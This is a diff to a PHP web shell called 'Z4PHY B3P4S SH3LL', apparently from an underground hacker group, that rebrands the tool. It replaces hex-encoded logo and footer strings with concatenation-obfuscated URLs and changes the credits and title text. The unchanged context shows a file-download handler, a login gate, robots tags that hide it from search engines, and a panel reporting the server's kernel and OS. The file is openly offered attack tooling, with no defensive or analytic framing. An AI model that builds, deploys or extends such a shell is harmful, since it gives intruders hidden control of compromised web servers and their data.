@@ -1,6 +1,6 @@
 <?php
 /*
-R3C0D3 BY https://t.me/zaynphantomhive
+R3C0D3 BY https://t.me/zaynphantomhive Thanks To Nulz Haxorstars
 */
 
 //head
@@ -40,9 +40,9 @@ if (isset($_GET['downloadfile'])) {
 }
 //config shell
 $s_he_ll_Name = "Z4"."PH"."Y "."B3"."P4S"." S"."H3"."LL";
-$s_he_ll_Logo = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x75\x6c\x7a\x2d\x61\x72\x63\x68\x69\x76\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6e\x75\x6c\x7a\x2e\x70\x6e\x67";
-$s_he_ll_Icon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x75\x6c\x7a\x2d\x61\x72\x63\x68\x69\x76\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6e\x75\x6c\x7a\x2e\x69\x63\x6f";
-$s_he_ll_Footer = "\x3c\x66\x6f\x6f\x74\x65\x72\x20\x63\x6c\x61\x73\x73\x3d\x22\x62\x67\x2d\x74\x72\x61\x6e\x73\x70\x61\x72\x65\x6e\x74\x20\x74\x65\x78\x74\x2d\x63\x65\x6e\x74\x65\x72\x20\x6c\x67\x3a\x74\x65\x78\x74\x2d\x63\x65\x6e\x74\x65\x72\x22\x3e\x3c\x64\x69\x76\x20\x63\x6c\x61\x73\x73\x3d\x22\x70\x2d\x34\x20\x66\x6f\x6e\x74\x2d\x62\x6f\x6c\x64\x20\x74\x65\x78\x74\x2d\x63\x65\x6e\x74\x65\x72\x20\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65\x20\x64\x61\x72\x6b\x3a\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65\x22\x3e\xc2\xa9\x20\x32\x30\x32\x32\x20\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x3a\x3c\x61\x20\x63\x6c\x61\x73\x73\x3d\x22\x74\x65\x78\x74\x2d\x72\x65\x64\x2d\x38\x30\x30\x20\x64\x61\x72\x6b\x3a\x74\x65\x78\x74\x2d\x72\x65\x64\x2d\x34\x30\x30\x22\x20\x68\x72\x65\x66\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x68\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x22\x3e\x4e\x75\x4c\x7a\x20\x48\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x3c\x2f\x61\x3e\x3c\x2f\x64\x69\x76\x3e\x3c\x2f\x66\x6f\x6f\x74\x65\x72\x3e";
+$s_he_ll_Logo = "ht"."tp"."s:/"."/ra"."w.gi"."thu"."b"."us"."er"."con"."te"."nt."."co"."m/z"."4p"."hyr"."/z"."4p"."hy"."-c0"."de"."/"."mai"."n/"."as"."set"."s/c"."i"."el".".p"."ng";
+$s_he_ll_Icon = "h"."tt"."ps:"."//"."r"."aw."."gi"."thu"."bu"."ser"."co"."nte"."nt."."com"."/z4"."ph"."yr"."/"."z4"."phy"."-c0"."de/"."ma"."in/"."ass"."ets"."/ci"."el-"."ph"."an"."tom"."hiv"."e.jp"."g";
+$s_he_ll_Footer = "<d"."iv"." cl"."as"."s='"."p-"."4 "."fo"."nt-"."bol"."d "."tex"."t-"."cen"."t"."er "."te"."xt-"."whi"."te "."da"."rk".":"."te"."xt"."-whi"."te'".">©"." "."2"."024"." Co"."py"."ri"."gh"."t: "."<a"." cl"."a"."ss="."'t"."ex"."t-r"."ed"."-8"."0"."0 "."da"."rk:"."te"."xt"."-r"."ed"."-40"."0' "."hre"."f="."'"."ht"."tps".":/"."/t".".me/"."za"."ynp"."han"."to"."mhi"."ve"."'>"."Za"."yn"." Ph"."ant"."omh"."iv"."e<"."/a".">"."</"."div".">";
 
 //tailwind config text color
 $txtBlack = "text-black";
@@ -482,12 +482,12 @@ if (empty($_SESSION['login'])) {
 
 <head>
     <title>
-        .:<?= $s_he_ll_Name ?> Login:.
+        .:<?= $s_he_ll_Name ?> LOGIN:.
     </title>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <meta name="description" content=".:<?= $s_he_ll_Name ?> Login:." />
+    <meta name="description" content=".:<?= $s_he_ll_Name ?> LOGIN:." />
     <meta name="robots" content="noindex, nofollow" />
     <meta name="googlebot" content="noindex, nofollow" />
     <meta name="bingbot" content="noindex, nofollow" />
@@ -774,7 +774,7 @@ if (empty($_SESSION['login'])) {
             <img src="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/terminal.png"
                 alt="terminal" /><span>Terminal</span>
             <strong>
-                <?= $s_he_ll_Name ?> Login
+                <?= $s_he_ll_Name ?> LOGIN
             </strong>
         </div>
         <div class="root" style="color: #d00c0c"></div>
@@ -1161,7 +1161,7 @@ $path = str_replace("\\", "/", $path);
 <body>
     <header class="w-full flex flex-row">
         <div class="shell whitespace-nowrap py-2 px-2 flex flex-col">
-            <a href="?hidden&path=<?=$path?>/&nulz&ganteng" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$s_he_ll_Logo?>" alt="LOGO"><h1 class="<?= $txtBlue ?> mx-2 fs-super trade-winds"><?= $s_he_ll_Name ?></h1></a>
+            <a href="?hidden&path=<?=$path?>/&nulz&ganteng" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$s_he_ll_Logo?>" alt="LOGO"><h1 class="<?= $txtRed ?> mx-2 fs-super trade-winds"><?= $s_he_ll_Name ?></h1></a>
             <span class="fs-xl poppins <?= $txtPurple ?>">KERNEL: <?= $kernel ?></span>
             <span class="fs-xl poppins <?= $txtPurple ?>">OS: <font class="ubuntu-mono <?= $txtGreen ?>"><?= $os ?>
                 </font>
